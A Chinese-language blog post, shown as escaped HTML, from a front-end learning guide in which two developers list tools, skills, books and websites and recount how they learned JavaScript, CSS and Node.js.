&lt;h2 id=&quot;继续提高&quot;&gt;&lt;a href=&quot;#继续提高&quot; class=&quot;headerlink&quot; title=&quot;继续提高&quot;&gt;&lt;/a&gt;继续提高&lt;/h2&gt;&lt;p&gt;有了前面的基础之后，前端基本算是入门了，这时候可能每个人心中都有了一些学习方向，如果还是没有。&lt;br&gt;可以参考前面必备技能部分提到的那两个项目，从里面选一些进行发展学习。以下是一些不错的方面：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://gruntjs.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Grunt&lt;/a&gt;：前端自动化工具，提高工作效率&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://lesscss.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;less css&lt;/a&gt;：优秀的CSS预处理器&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://getbootstrap.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;bootstrap&lt;/a&gt;：优秀的CSS框架，对没有设计师的团队很不错，与less结合使用效果完美&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://requirejs.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;requirejs&lt;/a&gt;：AMD规范的模块加载器，前端模块化趋势的必备工具&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://nodejs.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Node.js&lt;/a&gt;：JavaScript也可以做后台，前端工程师地位更上一步&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://angularjs.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;AngularJS&lt;/a&gt;：做Single Page Application的好工具&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/Guide/Mobile&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;移动端web开发&lt;/a&gt;：智能手机的普及让移动端的流量正在逐步赶超PC端&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://developer.chrome.com/devtools/docs/javascript-memory-profiling?hl=figoogle&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Javascript内存管理&lt;/a&gt;：SPA长期运行需要注意内存泄露的问题&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.amazon.com/Performance-JavaScript-Faster-Application-Interfaces/dp/059680279X/ref=sr_1_1?s=books&amp;amp;ie=UTF8&amp;amp;qid=undefined&amp;amp;sr=1-1&amp;amp;keywords=high+performance+javascript&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;High Performance JavaScript(Build Faster Web Application Interfaces)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://developer.yahoo.com/performance/rules.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Best Practices for Speeding Up Your Web Site&lt;/a&gt;：重要技能&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;一些个人经历&quot;&gt;&lt;a href=&quot;#一些个人经历&quot; class=&quot;headerlink&quot; title=&quot;一些个人经历&quot;&gt;&lt;/a&gt;一些个人经历&lt;/h2&gt;&lt;h3 id=&quot;LingyuCoder的学习经历&quot;&gt;&lt;a href=&quot;#LingyuCoder的学习经历&quot; class=&quot;headerlink&quot; title=&quot;LingyuCoder的学习经历&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://github.com/LingyuCoder&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;LingyuCoder&lt;/a&gt;的学习经历&lt;/h3&gt;&lt;p&gt;上面的大神都总结得差不多了，我这里就胡扯一些吧&lt;/p&gt;
&lt;p&gt;####工具&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;chrome dev tools：前端开发调试利器，着重注意几个功能：&lt;ul&gt;
&lt;li&gt;console（废话）&lt;/li&gt;
&lt;li&gt;elements:元素样式调整，很常用&lt;/li&gt;
&lt;li&gt;sources：代码中添加断点，单步调试，以及单步调试过程中查看内存中的对象&lt;ul&gt;
&lt;li&gt;watch expression：通过表达式查看当前内存中的值&lt;/li&gt;
&lt;li&gt;call stack：查看调用栈，开启async，可以看异步调用栈（这个非常有用，尤其是ajax调试的时候）&lt;/li&gt;
&lt;li&gt;scope variables：作用域链上的变量，非常有用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;network：抓包查看每个请求，非常重要，前后端联调必备&lt;/li&gt;
&lt;li&gt;timeline：分析渲染、js执行等等各个阶段，性能优化利器&lt;/li&gt;
&lt;li&gt;emulation：模拟移动端环境，mobile页面开发必备&lt;/li&gt;
&lt;li&gt;一些插件:&lt;ul&gt;
&lt;li&gt;liveload: 修改页面后自动刷新，不用按F5&lt;/li&gt;
&lt;li&gt;dimensions：直接在页面上测量的利器&lt;/li&gt;
&lt;li&gt;livestyle：css样式修改后自动起效果，不需要刷新，elements修改后也能同步到代码中&lt;/li&gt;
&lt;li&gt;image tool：测量，取色&lt;/li&gt;
&lt;li&gt;UC二维码：移动端调试扫码必备&lt;/li&gt;
&lt;li&gt;pagespeed，YSlow：页面性能分析和优化插件&lt;/li&gt;
&lt;li&gt;马克飞象：优秀的在线markdown编辑器，快速写周报，做记录&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;sublime text2：编码方便，插件多，速度快，性能好&lt;ul&gt;
&lt;li&gt;emmet：提升html编码速度必备&lt;/li&gt;
&lt;li&gt;sublimelinter + 各种语言的lint和hint：代码纠错&lt;/li&gt;
&lt;li&gt;一些snippets：自动补全，提升开发效率&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Intellij IDEA和WebStorm：集成开发环境，集成了各种功能，开发比sublime要方便，但会比较吃性能&lt;/li&gt;
&lt;li&gt;Mark Men：测量、取色、标注利器，拿到视觉稿之后第一个打开的软件&lt;/li&gt;
&lt;li&gt;GFW Fucker：我用红杏，可以的话买个虚拟服务器当梯子&lt;/li&gt;
&lt;li&gt;iHosts：非常优秀的hosts管理软件，轻松修改hosts，开发调试必备&lt;/li&gt;
&lt;li&gt;Charles：Mac 平台最好用的抓包分析工具&lt;/li&gt;
&lt;li&gt;Rythem：AlloyTeam出品的代理抓包软件，非常轻量，安装简单，移动端（真机）开发调试很好用&lt;/li&gt;
&lt;li&gt;Wunderlist：一个非常不错的Todo List，任务、需求多的时候管理起来很方便&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;####技能&lt;br&gt;前端的技能其实除了JavaScript（包括NodeJS）、HTML、CSS以外，还有很多。其实前端的技能树很大，这里只能列一些我开发中见到的说一说&lt;/p&gt;
&lt;p&gt;#####语言基础&lt;br&gt;JavaScript：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;作用域链、闭包、运行时上下文、this&lt;/li&gt;
&lt;li&gt;原型链、继承&lt;/li&gt;
&lt;li&gt;NodeJS基础和常用API&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;CSS：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;选择器&lt;/li&gt;
&lt;li&gt;浏览器兼容性及常见的hack处理&lt;/li&gt;
&lt;li&gt;CSS布局的方式和原理（盒子模型、BFC、IFC等等）&lt;/li&gt;
&lt;li&gt;CSS 3，如animation、gradient、等等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;HTML：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;语义化标签&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;#####进阶&lt;br&gt;JavaScript:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;异步控制（Promise、ES6 generator、Async）&lt;/li&gt;
&lt;li&gt;模块化的开发方式（AMD、CMD、KMD等等）&lt;/li&gt;
&lt;li&gt;JavaScript解释器的一些相关知识&lt;ul&gt;
&lt;li&gt;异步IO实现&lt;/li&gt;
&lt;li&gt;垃圾回收&lt;/li&gt;
&lt;li&gt;事件队列&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常用框架使用及其原理&lt;ul&gt;
&lt;li&gt;jQuery：基于选择器的框架，但个人认为不能叫框架，应该算工具库，因为不具备模块加载机制，其中源码很适合阅读钻研&lt;/li&gt;
&lt;li&gt;AngularJS/Avalon等MVVM框架：着重理解MVVM模式本身的理念和双向绑定的实现，如何解耦&lt;/li&gt;
&lt;li&gt;underscore：优秀的工具库，方便的理解常用工具代码片段的实现&lt;/li&gt;
&lt;li&gt;polymer/React: 组件化开发，面向未来，理解组件化开发的原理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;CSS和HTML：主要是CSS3的特性和HTML5的特性，以及浏览器处理的流程和绘制原理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DOM树、CSSOM树、渲染树的构建流程及页面渲染的过程&lt;/li&gt;
&lt;li&gt;解析HTML、CSS、JavaScript时造成的阻塞&lt;/li&gt;
&lt;li&gt;HTML5相关&lt;ul&gt;
&lt;li&gt;SVG及矢量图原理&lt;/li&gt;
&lt;li&gt;Canvas开发及动画原理（帧动画）&lt;/li&gt;
&lt;li&gt;Video和Audio&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;flex box布局方式&lt;/li&gt;
&lt;li&gt;icon fonts的使用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;常用NodeJs的package：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;koa&lt;/li&gt;
&lt;li&gt;express&lt;/li&gt;
&lt;li&gt;underscore&lt;/li&gt;
&lt;li&gt;async&lt;/li&gt;
&lt;li&gt;gulp&lt;/li&gt;
&lt;li&gt;grunt&lt;/li&gt;
&lt;li&gt;connect&lt;/li&gt;
&lt;li&gt;request&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一些理念：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;响应式Web&lt;/li&gt;
&lt;li&gt;优雅降级、渐进增强&lt;/li&gt;
&lt;li&gt;don`t make me think&lt;/li&gt;
&lt;li&gt;网页可用性、可访问性、其中的意义&lt;/li&gt;
&lt;li&gt;SEO搜索引擎优化，了解搜索引擎的原理&lt;/li&gt;
&lt;li&gt;SPA的好处和问题&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;性能优化：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;减少请求数量（sprite、combo）&lt;/li&gt;
&lt;li&gt;善用缓存（application cache、http缓存、CDN、localstorage、sessionstorage，备忘录模式）&lt;/li&gt;
&lt;li&gt;减少选择器消耗（从右到左），减少DOM操作（DOM和JavaScript解释器的分离）&lt;/li&gt;
&lt;li&gt;CSS的回流与重绘&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;#####项目&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;版本管理：首推Git，用过Git都不会想用SVN了&lt;ul&gt;
&lt;li&gt;Git：本地版本管理的机制&lt;/li&gt;
&lt;li&gt;SVN：远程中心的版本管理机制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;自动化构建：主要就是less、模板、coffee等的预处理以及对代码压缩和合并&lt;ul&gt;
&lt;li&gt;Gulp：基于流构建，速度快、模块质量好&lt;/li&gt;
&lt;li&gt;Grunt：独立任务构建，速度慢，配置蛋疼，灵活性高&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;预处理和模板引擎&lt;ul&gt;
&lt;li&gt;less：语法简单，但功能有限&lt;/li&gt;
&lt;li&gt;jade、ejs、velocity等模板引擎，各有各的长处&lt;/li&gt;
&lt;li&gt;coffee：python工程师最爱，我没用过&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;环境搭建：主要是将线上代码映射到本地，并在本地启动一个demo服务器，至于模拟数据的mock，见仁见智了&lt;ul&gt;
&lt;li&gt;本地代理：ihosts&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;自动化测试：在业务较为稳定的情况下，可以通过自动化测试来减少测试的事件，但需求较多的时候，维护测试用例的成本会很高，可能用自动化测试会起到反效果&lt;ul&gt;
&lt;li&gt;jasmine&lt;/li&gt;
&lt;li&gt;mocha&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;生态系统&lt;ul&gt;
&lt;li&gt;npm&lt;/li&gt;
&lt;li&gt;bower&lt;/li&gt;
&lt;li&gt;spm&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;搭建一个属于自己的博客&lt;ul&gt;
&lt;li&gt;git pages&lt;/li&gt;
&lt;li&gt;hexo&lt;/li&gt;
&lt;li&gt;jekyll&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;#####未来&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Web Componets：面向未来的组件化开发方式&lt;ul&gt;
&lt;li&gt;HTML模板&lt;/li&gt;
&lt;li&gt;Shadow DOM&lt;/li&gt;
&lt;li&gt;Custom Elements&lt;/li&gt;
&lt;li&gt;HTML Import&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;移动端Native开发：这也是需要了解的，以后前端工程师会经常地和webview打交道，也要了解native开发&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;#####其他&lt;br&gt;有些东西不是考敲码就能弄好的，我参与实习的时候感受到了很多，这些是我遇到的也是我感觉自己做的不好的地方&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;对于业务的思考&lt;/strong&gt;：我个人这方面非常欠缺，所以放在最前面，在敲码前要多思考业务&lt;/li&gt;
&lt;li&gt;交流和沟通能力：这个非常重要，前端同时需要与项目经理、产品、交互、后台打交道，沟通不善会导致很多无用功，延缓项目&lt;/li&gt;
&lt;li&gt;知识管理、时间管理：input和output的平衡，output是最好的input。如何做好分享，参与社区，做好交流，作好记录&lt;/li&gt;
&lt;li&gt;对新技术的渴望，以及敢于尝试&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;####入门书&lt;br&gt;入门可以通过啃书，但书本上的东西很多都已经过时了，在啃书的同时，也要持续关注技术的新动态。这里推几本我觉着不错的书：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;《JavaScript高级编程》：可以作为入门书籍，但同时也是高级书籍，可以快速吸收基础，等到提升再回来重新看&lt;/li&gt;
&lt;li&gt;《JavaScript权威指南》：不太适合入门，但是必备，不理解的地方就去查阅一下，很有帮助&lt;/li&gt;
&lt;li&gt;《编写可维护的JavaScript》和：&lt;/li&gt;
&lt;li&gt;《Node.js开发指南》：不错的Nodejs入门书籍&lt;/li&gt;
&lt;li&gt;《深入浅出Node.js》：Nodejs进阶书籍，必备&lt;/li&gt;
&lt;li&gt;《JavaScript异步编程》：理解JS异步的编程理念&lt;/li&gt;
&lt;li&gt;《JavaScript模式》和《JavaScript设计模式》：JavaScript的代码模式和设计模式，将开发思维转变到JavaScript，非常好的书&lt;/li&gt;
&lt;li&gt;《JavaScript框架设计》：在用轮子同时，应当知道轮子是怎么转起来的，讲解很详细，从源码级别讲解框架的各个部分的实现，配合一个现有框架阅读，可以学到很多东西&lt;/li&gt;
&lt;li&gt;《Don`t make me think》：网页设计的理念，了解用户行为，非常不错&lt;/li&gt;
&lt;li&gt;《CSS禅意花园》：经久不衰的一部著作，同样传递了网页设计中的理念以及设计中需要注意的问题&lt;/li&gt;
&lt;li&gt;《高性能JavaScript》和《高性能HTML5》：强调性能的书，其中不只是性能优化，还有很多原理层面的东西值得学习&lt;/li&gt;
&lt;li&gt;《HTML5 Canvas核心技术》：我正在读的一本书，对于canvas的使用，动画的实现，以及动画框架的开发都非常有帮助&lt;/li&gt;
&lt;li&gt;《HTTP权威指南》：HTTP协议相关必备，前端开发调试的时候也会经常涉及到其中的知识&lt;/li&gt;
&lt;li&gt;《响应式Web设计》：技术本身不难，重要的是响应式网页的设计理念，以及移动先行的思想&lt;/li&gt;
&lt;li&gt;《JavaScript语言精粹》：老道的书，也是普及JavaScript的开发思维的一本好书，非常适合入门&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;####一些不错的网站&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;github&lt;/a&gt;：没啥好说的，多阅读别人的源码，多上传自己的源码，向世界各地的大牛学习&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://codepen.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;codepen&lt;/a&gt;：感受前端之美的必选之地，里面有很多酷炫的效果和优秀的插件&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.echojs.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;echojs&lt;/a&gt;：快速了解js新资讯的网站&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://stackoverflow.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;stackoverflow&lt;/a&gt;和&lt;a href=&quot;segmentfault.com&quot;&gt;segmentfault&lt;/a&gt;：基本上各种问题都能在上面获得解答&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://developers.google.com/web/fundamentals/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;google web fundamentals&lt;/a&gt;：每篇文章都适合仔细阅读&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.staticfile.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;static files&lt;/a&gt;：开放的CDN，很好用&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.iconfont.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;iconfont&lt;/a&gt;：阿里的矢量图标库，非常不错，支持CDN而且支持项目&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.html5rocks.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;html5 rocks&lt;/a&gt;: 一个不错的网站，很多浏览器的新特性以及前沿的技术，都能在这上面找到文章&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://css-tricks.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;css tricks&lt;/a&gt;：如何活用CSS，以及了解CSS新特性，这里可以满足你&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://bonsaiden.github.io/JavaScript-Garden/zh/#object.general&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;JavaScript 秘密花园&lt;/a&gt; JavaScript初学必看，非常不错&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.w3cplus.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;w3cplus&lt;/a&gt;：一个前端学习的网站，里面的文章质量都挺不错的&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://nodeschool.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;node school&lt;/a&gt;：一个不错的node学习网站&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://pcottle.github.io/learnGitBranching/?demo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;learn git branch&lt;/a&gt;：一个git学习网站，交互很棒&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.html-js.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;前端乱炖&lt;/a&gt;：一个前端文章分享的社区，有很多优秀文章&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://deerchao.net/tutorials/regex/regex.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;正则表达式&lt;/a&gt;：一个正则表达式入门教程，非常值得一看&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.ruanyifeng.com/blog/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;阮一峰的博客&lt;/a&gt;和&lt;a href=&quot;http://www.zhangxinxu.com/wordpress/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;张鑫旭的博客&lt;/a&gt;：快速了解某些知识的捷径，但是如果需要深挖，还需要其他的资源&lt;/li&gt;
&lt;li&gt;各路大牛的博客：这个太多了，就不贴了，知乎上有很全的&lt;/li&gt;
&lt;li&gt;各种规范的官方网站，不懂得时候读规范&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;####历程&lt;br&gt;以前是做Java SSH的，半路出家做的前端，所以水平比较弱，遇到问题也比较多。基本上入门靠看书和&lt;a href=&quot;http://www.w3school.com.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;W3C School&lt;/a&gt;上的教程，以及一些前端博客，如&lt;a href=&quot;http://www.cnblogs.com/TomXu/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;汤姆大叔的博客&lt;/a&gt;。以前也只是使用jQuery，原生js也没有太多的钻研，后来逐渐看了很多本动物书，比如老道的语言精粹等等。从这些书中学到了很多语言层面的知识。但这显然是不够的，所以我经常会去社区上看看大家在谈论什么，然后去看看相关的资料，感兴趣就会多找些资料看看，或者写一写demo。学CSS主要就是通过这种方式。后来开始更多的关注各路大牛的博客和一些比较深的书籍，以及关注一些新的知识和框架，并且不断地练手提交代码到github，这样也学到了很多知识。在实习的过程中，切身参与到实际项目开发之中，能学到很多在学校学不到的理念和思维，这点也有很大的帮助。不说了，我要去搬砖求offer了…&lt;/p&gt;
&lt;h3 id=&quot;MrRaindrop的学习经历&quot;&gt;&lt;a href=&quot;#MrRaindrop的学习经历&quot; class=&quot;headerlink&quot; title=&quot;MrRaindrop的学习经历&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://github.com/MrRaindrop&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;MrRaindrop&lt;/a&gt;的学习经历&lt;/h3&gt;&lt;p&gt;应&lt;a href=&quot;https://github.com/qiu-deqing&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;qiu神&lt;/a&gt;的邀请分享一下前端学习经验，这里对前端知识体系架构就不做总结了，各位大神们的总结已经相当到位了，我就贡献几个个人认为还比较有用的链接大家研究研究就好，然后主要分享一下我在前端学习过程中遇到的问题和总结的经验教训吧，如果能帮到想要入门的FE初学者（我就姑且假定为本文的读者受众类型了），让他们少走点弯路，每走一步都知道自己下一步的方向，这是最好了。各位大神的总结和分享详见qiu神整理的&lt;a href=&quot;https://github.com/qiu-deqing/FE-learning&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;FE-learning&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;先说下，前端这个东西每个人都可以有适合自己的学习方法，这篇仅作参考，写的有点乱，各位凑合看。&lt;/p&gt;
&lt;h4 id=&quot;缘起&quot;&gt;&lt;a href=&quot;#缘起&quot; class=&quot;headerlink&quot; title=&quot;缘起&quot;&gt;&lt;/a&gt;缘起&lt;/h4&gt;&lt;p&gt;我是属于误打误撞进了前端，之前一直往做游戏的方向去来着，搞过游戏网站，玩过游戏引擎，比如unity，unreal这种商业引擎，捣鼓了几个游戏原型，不过自打研一进了实验室，直接就被导师派去写了js，导师给了我半个月时间让我写个基于百度地图api的数据展示页面，虽然这个时间还是相当宽裕的，不过之前没怎么写过js，也不会用地图api，于是我就一边啃着&lt;a href=&quot;http://book.douban.com/subject/2228378/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《Javascript权威指南》&lt;/a&gt;（犀牛书）一边参考实验室前人留下的“代码”，总算是把功能都写出来了。那个页面算我的js入门作了，也是我前端学习路线的开始。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;现在想来，虽然指派了去做前端，但是一直做下去并做好还是得靠兴趣维持，当然前端是一个趣味性十足的技术领域，而且社区每天都很“热闹”。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;项目，下一个项目&quot;&gt;&lt;a href=&quot;#项目，下一个项目&quot; class=&quot;headerlink&quot; title=&quot;项目，下一个项目&quot;&gt;&lt;/a&gt;项目，下一个项目&lt;/h4&gt;&lt;p&gt;我个人认为前端的学习，初学阶段你可以完全脱离开书本，以&lt;strong&gt;项目驱动&lt;/strong&gt;。虽然我个人是从犀牛书开始啃的，不过如果你没有充足的时间，或者觉得啃大部头乏而无味的话，还是别像我这样。当然了如果决定啃书最好是把书里的例子都跟着敲一遍的。我上研之前没接触过js，4月份还没开学呢就被直接被导师甩了个百度地图api的项目到脸上，接着就是各种ERP，地图数据展示，虽然换着花样来一点不重样，不过基本上都是前端的活，SSH和android开发也打过酱油，整个实验室就我一个人写前端敢信？富客户端SPA时代的后端就是一个restful接口，代码量基本都在前端啊，写的我一个人怎一个爽字了得…期间跟着导师感受了一把创业，每天从7点搞到晚上10点，也算是经历了一段快速成长期。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;掌握一门技术先掌握它的大体框架，想一个能实现的点子，做一个能跑就行的demo，再去完善它的细节，等到demo完成了，对这门技术有了一个感性的认识，再去啃书，收获会大很多。我从开始原生js写到jquery，再到extjs，再到angularjs，从导师指定技术，到自己做技术选型，一个项目接着一个项目的练，就跟打怪升级似的。当然没有项目就去自己创造项目，动手实现自己的想法是件有乐趣和成就感的事。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;收集癖和知识管理&quot;&gt;&lt;a href=&quot;#收集癖和知识管理&quot; class=&quot;headerlink&quot; title=&quot;收集癖和知识管理&quot;&gt;&lt;/a&gt;收集癖和知识管理&lt;/h4&gt;&lt;p&gt;前端学习有个特点，很多东西都很零碎，分散，需要你自己去整理、归纳和总结。在微博、知乎上follow了众多的大神，你不仅仅是为了听八卦，大神们的只言片语有时候留下的是无尽的余味，很有可能一个不经意提到的一个词就成为你下一个学习的目标。&lt;strong&gt;收集这些信息，善用google，提问，思考。&lt;/strong&gt;就像游戏里的收集要素，前端学习也是充满搜集要素的一个“游戏”，只不过你需要一个知识管理工具来充当物品栏和仓库，我所知道的大牛们无一不是知识管理工具的重度使用者。以前用的oneNote，那时候还没绑定到云存储，现在基本上用evernote，笔记已经累计到1200+篇。书签一直打算用delicious，因为它是基于tag管理的，但一直没用起来。当然重点不在于这些工具，但是趁手的工具可以提高你的学习效率。最关键当然是随时&lt;strong&gt;保持旺盛的学习欲望&lt;/strong&gt;，你的目标是了解有关前端的一切（当然不是所有都要掌握，因为毕竟你的精力有限，而且现实的说这也不太可能）。&lt;/p&gt;
&lt;h4 id=&quot;跟对神&quot;&gt;&lt;a href=&quot;#跟对神&quot; class=&quot;headerlink&quot; title=&quot;跟对神&quot;&gt;&lt;/a&gt;跟对神&lt;/h4&gt;&lt;p&gt;这个可控性貌似不大…跟对老大这个就不多说了，一定程度要看造化。不过话说回来，多跟身边的高手交流是王道，这个高手不一定要多高，但是一定要对技术有热情。研一的时候热情高涨，每天7点进实验室门，然后发现有个家伙居然比我还早到。后来发现这家伙上午就走了，下午又来了，而且导师对此习以为常，原来这家伙晚上不睡觉通宵写代码，上午才跑回去睡。后来经常和这位神讨论问题，每次感觉经验值蹭蹭蹭的往上涨。然后实验室还有一位神，被前面这位通宵神形容为“只能望其项背，一直在追赶，从来没赶上”，两位神的特点都是什么都了解一点，所以什么都能跟你讨论得起来，我有段时间做了个读书计划，从c/c++到vc/mfc再到unix网络编程，最后一路看到java核心技术和MSDN上的C#编程指南，和神们也能扯得很high了。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;总之就是这两位神把我拉进了坑，或者说从一个坑跳进另一坑，虽然两位神都不是搞前端的，不过技术之间总有相通之处。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;读书&quot;&gt;&lt;a href=&quot;#读书&quot; class=&quot;headerlink&quot; title=&quot;读书&quot;&gt;&lt;/a&gt;读书&lt;/h4&gt;&lt;p&gt;读书，多读书，读好书。在&lt;a href=&quot;http://mindhacks.cn/topics/learning-method/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;刘未鹏的博客&lt;/a&gt;里看到过一个公式，&lt;strong&gt;你第一个月的工资等于之前买过（读过）的技术书价格总和&lt;/strong&gt;（这里说的技术书指那些经典的公认的好书）。讨论这个公式的正确性似乎没什么意义，然而它的合理性是毋庸置疑的，那就是多读经典技术书。最极端的一个例子，google的徐宥在&lt;a href=&quot;http://blog.youxu.info/2009/08/06/my-undergraduate-year/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;我的大学&lt;/a&gt;里面说他扫荡了图书馆的整个TP312书架…对于前端的经典书籍，后面列了一个我收集的&lt;a href=&quot;http://book.douban.com/doulist/13701898/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;前端书列&lt;/a&gt;（如果有遗漏的前端经典好书，还请留言告诉我），有条件可以尝试刷一遍这些书，我也是在找完整的时间去啃完它们。之前说的，前端知识点松散，收集零散的知识点，从博客里快速学习等，这些只是前端学习的一个方面，如果你要想深入理解一个知识体系，了解它的来龙去脉，对它建立系统认识，读经典书还是必不可少的。&lt;/p&gt;
&lt;p&gt;我从最开始啃完犀牛书，然后接着去看了其他一些和前端干系不大的经典技术书，再后来通过实验室的项目和自己弄的一些小项目逐渐对前端领域比较上路以后，又看了《Javascript模式》、《Javascript设计模式》、《编写可维护的Javascript》，后来了解到node并开始用node搞点小玩意儿，又看了本《NodeJS up and run》和《Mongodb权威指南》，不过感觉前者略坑。那会儿朴灵那本深入浅出（晒书么么哒）还没出，后来出了就去图书馆借来看完，这么看下来感觉还不错，不过感觉看的还是偏少了，还需要继续刷（参照上面的书列）。&lt;/p&gt;
